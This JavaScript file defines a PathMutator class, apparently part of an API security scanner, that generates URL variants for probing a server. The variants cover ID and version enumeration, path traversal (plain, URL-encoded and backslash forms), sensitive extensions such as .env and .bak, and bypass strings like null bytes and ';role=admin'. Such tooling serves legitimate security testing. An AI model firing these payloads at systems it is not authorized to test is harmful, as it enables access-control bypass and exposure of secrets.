class PathMutator{

    mutate(path){
        const allMutations =[];
        allMutations.push(...this._idEnumeration(path));
        allMutations.push(...this._addedExtension(path));
        allMutations.push(...this._addingJunk(path));
        allMutations.push(...this._caseSwitching(path));
        allMutations.push(...this._doubleSlashing(path));
        allMutations.push(...this._pathTraversal(path));
        allMutations.push(...this._versionSwitching(path));

        return allMutations;
    }

    _idEnumeration(path){
        const match = path.match(/\d+/g);
        if (!match) return[];

        const numStr = match[match.length-1];
        const num = parseInt(numStr);
        const candidates = [num-1, num+1, 0, 1, 9999];

        return candidates.map(candidate =>{
            const mutPath = path.replace(numStr, String(candidate));
            return{
                path: mutPath,
                strategy: `path_id_enumeration:${mutPath}`,
                reason: `Testing if different id ${candidate} in path is accepted by server`
            };
        });
    }

    _pathTraversal(path){
        const traversalPayloads = [
    // Standard traversal - different depths
    '/../',
    '/../../',
    '/../../../',

    // With a target at the end - common sensitive paths
    '/../admin',
    '/../../admin',
    '/../config',
    '/../settings',
    '/../internal',

    // URL encoded versions — some servers decode these after auth checks
    '/%2e%2e/',           
    '/%2e%2e/%2e%2e/',   
    '/%252e%252e/',      

    // Backslash variants — Windows servers
    '/..\\',
    '/..\\..\\',
        ];

        return traversalPayloads.map(payload =>{
            const mutPath = path + payload;
            return{
                path: mutPath,
                strategy: `path_traversal:${mutPath}`,
                reason: `Testing if path traversal url exposes restricted resources`
            };
        });
    }

    _addedExtension(path){
        const extensions = [
    // Format switching 
    '.json',
    '.xml',
    '.yaml',
    '.csv',

    // Backup files 
    '.bak',
    '.old',
    '.backup',
    '.copy',
    '.tmp',

    // Source code exposure 
    '.js',
    '.php',
    '.py',
    '.rb',
    '.env',

    // Config files 
    '.config',
    '.conf',
    '.ini',
    '.yml',

    // Log files
    '.log',

    // Archive files
    '.zip',
    '.tar',
    '.gz',
        ];
        
        return extensions.map(extension =>{
            const mutPath = path + extension;
            return{
                path: mutPath,
                strategy: `added_extension:${mutPath}`,
                reason: `Testing if ${extension} extension added to path exposes restricted resources`
            };
        });
    }

    _versionSwitching(path){
        const match = path.match(/v\d+/g);
        if (!match) return[];

        const versionStr = match[match.length-1];
        const num = parseInt(versionStr.slice(1));
        const candidates = [num-1, num+1, num+2, num+5, 9999];

        return candidates.map(candidate =>{
            const mutPath = path.replace(versionStr, `v${candidate}`);
            return{
                path: mutPath,
                strategy: `version_switching:${mutPath}`,
                reason: `Testing if different version ${candidate} in path is accepted by server`
            };
        });
    }

    _caseSwitching(path){
        const segments = path.split('/')
            .filter(s => s !== '')
            .filter(s => isNaN(s))
            .filter(s => !s.match(/v\d+$/));
        
        return segments.map(segment =>{
            const mutPath = path.replace(segment, segment.toUpperCase());
            return{
                path: mutPath,
                strategy: `case_switching:${mutPath}`,
                reason: `Testing if different case of ${segment} in path is accepted by server`
            };
        });
        
    }

    _doubleSlashing(path){
        const mutPath = path.replace(/\//g,"//")
        return[{
                path: mutPath,
                strategy: `double_slashing:${mutPath}`,
                reason: `Testing if adding double slashes in path is accepted by server`
        }];
    }

    _addingJunk(path){
        const junkPayloads = [
    // Semicolon injection 
    ';admin',
    ';role=admin',
    ';/../',

    // Null byte 
    '%00',
    '%00.json',

    // Fragment 
    '#bypass',
    '#admin',

    // Query string confusion 
    '?admin=true',
    '?role=admin',
    '?debug=true',

    // Whitespace encoding
    '%20admin',
    '%09',          // tab character

    // Unicode tricks
    '%ef%bc%8f',    // unicode forward slash
    '\u0000',       // null character
        ];

        return junkPayloads.map(payload =>{
            const mutPath = path + payload;
            return{
                path: mutPath,
                strategy: `adding_junk:${mutPath}`,
                reason: `Testing adding junk in path `
            };
        });
    }

}

module.exports = PathMutator;
